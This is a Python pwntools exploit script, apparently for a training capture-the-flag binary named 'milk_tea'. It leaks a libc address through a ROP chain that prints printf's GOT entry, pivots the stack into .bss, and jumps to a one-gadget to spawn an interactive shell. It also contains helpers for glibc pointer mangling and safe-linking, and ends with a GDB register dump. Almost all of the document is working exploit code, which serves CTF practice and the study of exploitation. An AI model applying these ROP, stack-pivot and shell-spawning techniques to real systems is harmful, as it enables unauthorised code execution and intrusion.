#!/usr/bin/env python3
from pwn import *

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def exit_funcs_encrypt(val: int, key: int):
    r_bits = 0x11
    max_bits = 64
    enc = val ^ key
    return (enc << r_bits % max_bits) & (2 ** max_bits - 1) | ((enc & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

def exit_funcs_decrypt(val: int, key: int):
    r_bits = 0x11
    rotated = (2**64-1)&(val>>r_bits|val<<(64-r_bits))
    return rotated ^ key

def fastbin_encrypt(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

def fastbin_decrypt(val: int):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

exe = ELF("./milk_tea")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

GDB_SCRIPT = f"""
set disassembly-flavor intel
break *main
continue
"""

context.binary = exe
context.aslr = False
IP     = 'localhost'   
PORT   = 30004

"""
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

address of order is 0x4040a0
"""

ORDER = 0x4040a0
LEAVE_RET = 0x4012a7
RET = 0x4012a8
POP_RDI = 0x401203
PUTS_PLT = 0x401070
PRINTF_GOT = 0x404020
START = 0x00000000004010b0
MAIN = 0x401208

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # argv = [ld.path, exe.path]
        # env = {"LD_PRELOAD": libc.path}
        # r = process(argv, env=env)
        if args.GDB:
            gdb.attach(r, gdbscript=GDB_SCRIPT)
    else:
        r = remote(IP, PORT)
    return r

t = conn()
context.log_level = 'debug'
# we need to leak libc address first
# call puts(GOT of puts)
rop = ROP(exe)

for _ in range(24):
    rop.raw(RET) # need to pad with rets otherwise we will segfault later on
rop.rdi = PRINTF_GOT # GOT of printf
rop.raw(PUTS_PLT) # PLT of puts
rop.rbp = 0x404500 # this is necessary so we don't crash later in the 2nd round of program execution
rop.raw(0x40127d) # loop back to the part of main that takes in input which overwrites saved RIP
# save the rop chain in order so that we can pivot to it later
sa(b"order: ", rop.chain())

# now we stack pivot into order (which is in .bss) to utilise our rop chain
pl = 0x30 * b'a' + p64(ORDER - 8) + p64(LEAVE_RET)
sa(b"Feedback > ", pl)
ru(b"Thank you and see you soon!\n")
PRINTF_LEAK = u64(rpad(ru(b"\n")[:-1]))
lhex(PRINTF_LEAK, "printf leak")
libc.address = PRINTF_LEAK - libc.sym['printf']
lhex(libc.address, "libc address")

# 2nd round of program execution
pl2 = 0x30 * b'a' + p64(0) + p64(libc.address + 0x50a40) # one gadget
pause()
se(pl2)
it()

"""
$rax: 0x0000000000000000
$rbx: 0x0000000000000000
$rcx: 0x00001555553148f7 <write+0x17>  ->  0x5177fffff0003d48 ('H='?)
$rdx: 0x0000000000000001
$rsp: 0x0000000000404510  ->  0x0000000000000000
$rbp: 0x0000000000000000
$rsi: 0x0000000000000001
$rdi: 0x000015555541ca70 <_IO_stdfile_1_lock>  ->  0x0000000000000000
$rip: 0x000015555530da32 <exec_comm+0x2a2>  ->  0x000000f0248c8b4c
$r8 : 0x000000000000001b
$r9 : 0x0000155555520040 <_dl_fini>  ->  0xe5894855fa1e0ff3
$r10: 0x0000000000402069  ->  0x6b63616264656546 'Feedback > '
$r11: 0x0000000000000246
$r12: 0x00007fffffffd748  ->  0x00007fffffffda37  ->  0x552f632f746e6d2f '/mnt/c/Users/chiae/Downloads/greycademy25-challs/greycademy-qual[...]'
$r13: 0x0000000000401208 <main>  ->  0xe5894855fa1e0ff3
$r14: 0x0000000000403e18 <__do_global_dtors_aux_fini_array_entry>  ->  0x0000000000401160 <__do_global_dtors_aux>  ->  0x2f1d3d80fa1e0ff3
$r15: 0x0000155555554040 <_rtld_global>  ->  0x00001555555552e0  ->  0x0000000000000000
$fs_base: 0x00001555554fa740  ->  [loop detected]
$gs_base: 0x0000000000000000
$eflags: 0x206 [ident align vx86 resume nested overflow direction INTERRUPT trap sign zero adjust PARITY carry] [Ring=3]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
"""